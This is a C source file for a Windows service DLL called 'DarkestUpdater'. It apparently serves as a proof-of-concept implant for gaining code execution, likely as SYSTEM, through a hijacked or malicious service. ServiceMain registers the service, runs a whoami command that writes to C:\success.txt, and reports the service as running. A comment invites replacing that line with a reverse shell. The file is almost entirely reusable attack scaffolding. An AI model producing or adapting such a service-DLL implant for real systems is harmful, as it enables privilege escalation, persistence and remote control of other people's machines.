//
// Created by mikul on 04.01.2026.
//

#include "Darkest_updater.h"
#include "library.h"

SERVICE_STATUS        g_ServiceStatus = {0};
SERVICE_STATUS_HANDLE g_StatusHandle = NULL;

__declspec(dllexport) void WINAPI ServiceMain(DWORD argc, LPTSTR *argv) {
    g_StatusHandle = RegisterServiceCtrlHandler("DarkestUpdater", NULL);

    // Tell Windows we are "Starting"
    g_ServiceStatus.dwServiceType = SERVICE_WIN32_SHARE_PROCESS;
    g_ServiceStatus.dwCurrentState = SERVICE_START_PENDING;
    SetServiceStatus(g_StatusHandle, &g_ServiceStatus);

    // --- DO YOUR WORK HERE ---
    // Launch your reverse shell or write your success.txt
    system("whoami > C:\\success.txt");

    // Tell Windows we are "Running"
    g_ServiceStatus.dwCurrentState = SERVICE_RUNNING;
    SetServiceStatus(g_StatusHandle, &g_ServiceStatus);
}





